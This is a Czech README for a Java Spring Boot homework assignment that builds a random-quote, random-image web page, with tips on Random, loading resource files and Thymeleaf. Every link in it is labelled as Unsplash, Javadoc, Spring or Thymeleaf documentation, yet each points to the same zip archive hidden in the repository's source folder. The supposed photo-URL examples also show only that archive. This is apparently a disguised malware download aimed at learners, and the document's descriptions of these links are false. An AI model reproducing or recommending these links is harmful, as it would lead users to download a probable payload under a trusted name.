# Úkol 2

Cílem je vytvořit webovou stránku, která při každém načtení zobrazí náhodně zvolený citát a náhodně zvolený obrázek. Stránka může vypadat nějak takhle
(v projektu jsou k tomu připravené styly), ale fantazii se meze nekladou:

![screenshot](screenshot.jpg)

1. Udělej fork zdrojového repository do svého účtu na GitHubu.
1. Naklonuj si repository **ze svého účtu** na GitHubu na lokální počítač.
1. Spusť si naklonovanou aplikaci a otevři v prohlížeči stránku [http://localhost:8080/](http://localhost:8080/). Zobrazí se stránka s jedním citátem a
   obrázkem. Stránka je ovšem statická, při obnově stránky se nic nemění.
1. Uprav stránku tak, aby byla dynamická – aby se při každém načtení text i obrázek náhodně měnil.
1. Zkontroluj výsledek v prohlížeči.
1. *Commitni* a *pushnni* změny (výsledný kód) do svého repository na GitHubu.
1. Vlož odkaz na své repository do tabulky s úkoly na Google Drive ()

## Mohlo by se hodit

Jako zdroj obrázků může použít třeba [Unsplash](https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip) – web s obrázky a fotografiemi [zdarma](https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip). Obrázky z něj můžeš
stáhnout do své aplikace nebo je můžeš odkazovat přímo z jejich webu. Pokud chceš odkázat přímo na fotku s kódem `XXX` (kód je těch cca 10 znaků na konci URL
fotky), můžeš použít následující odkaz:

```
https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip
https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip
```

Druhá varianta určuje požadované rozměry obrázku – pokud má obrázek jiný poměr stran, ořízne se na požadovaný poměr stran. Přesné rozměry obrazovky uživatele
ale neřeš – obrázek se pomocí CSS natáhne nebo smrští tak, aby pokryl celou stránku.

Jako zdroj citátů můžeš použít soubor `src/main/resources/citaty.txt`, který je součástí staženého projektu.

### Náhodná čísla

Pro generování náhodných čísel v Javě slouží třída [Random](https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip).

### Načtení textového souboru z *resourců*

Kód pro načtení řádků souboru v *resourcech* do seznamu řetězců (`List<String>`):

```java
private static List<String> readAllLines(String resource)throws IOException{
    //Soubory z resources se získávají pomocí classloaderu. Nejprve musíme získat aktuální classloader.
    ClassLoader classLoader=Thread.currentThread().getContextClassLoader();

    //Pomocí metody getResourceAsStream() získáme z classloaderu InpuStream, který čte z příslušného souboru.
    //Následně InputStream převedeme na BufferedRead, který čte text v kódování UTF-8 
    try(InputStream inputStream=classLoader.getResourceAsStream(resource);
        BufferedReader reader=new BufferedReader(new InputStreamReader(inputStream,StandardCharsets.UTF_8))){

    //Metoda lines() vrací stream řádků ze souboru. Pomocí kolektoru převedeme Stream<String> na List<String>.
    return reader
        .lines()
        .collect(Collectors.toList());
    }
}

// příklad volání: readAllLines("citaty.txt")
```

### Vytvoření seznamu textových řetězců přímo ve zdrojovém kódu Javy

Pokud chci vytvořit seznam několika textových řetězců a nechci je mít v externím souboru, můžu použít metodu `Arrays.asList()`:

```java
List<String> seznamTextu=Arrays.asList("řetězec 1","řetězec 2","další řetězec","ještě jiný řetězec");
```

### Obrázek na pozadí v inline stylu

Kaskádové styly (CSS) je možné psát i ve formě *inline stylů* – příslušný CSS kód je uvedený hned u HTML elementu, ke kterému se vztahuje, konkrétně v atributu
`style`. Následující HTML kód tedy vytvoří `div`, který bude mít nastavenou červenou barvu pozadí.

```html

<div style="background-color: red">Tento text má červenou barvu pozadí.</div>
```

### Vložení HTML místo obyčejného textu přes Thymeleaf

Když v Thymeleaf použiješ atribut `th:text`, vloží se obsah atributu do stránky jako obyčejný text. Tzn. pokud bude obsahovat nějaké HTML značky, zobrazí se
tyto značky na stránce textově, např. `<div>`. Pokud chceš vložit text jako HTML, je potřeba použít `th:utext` (jako *unescaped text*). **Pozor, takto vložený
kód se nijak nekontroluje. Je tedy potřeba takto vkládat pouze HTML kód, kterému důvěřuješ. V žádném případě takto nelze vkládat kód, který pochází od
uživatele. Uživatel by totiž mohl do kódu podstrčit třeba značku `<script>` a spustit v prohlížeči jakýkoli svůj kód.**

### Odkazy

* odkaz na stránku [Lekce 2](https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip)
* Java SE 11 [Javadoc](https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip) – dokumentace všech tříd, které jsou součástí základní Javy ve verzi 11.
* Dokumentace [Spring Boot](https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip) – odsud je anotace `@SpringBootApplication` a třída `SpringApplication`.
* Dokumentace [Spring Framework](https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip) – odsud jsou anotace `@Controller`, `@GetRequest` a třída `ModelAndView`.
* Dokumentace [Thymeleaf](https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip) – šablonovací systém pro HTML použitý v projektu.
* [Unsplash](https://github.com/daduelle/j2w-ukol02/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol2/ukol_w_j_v3.0.zip) – obrázky a fotografie k použití zdarma
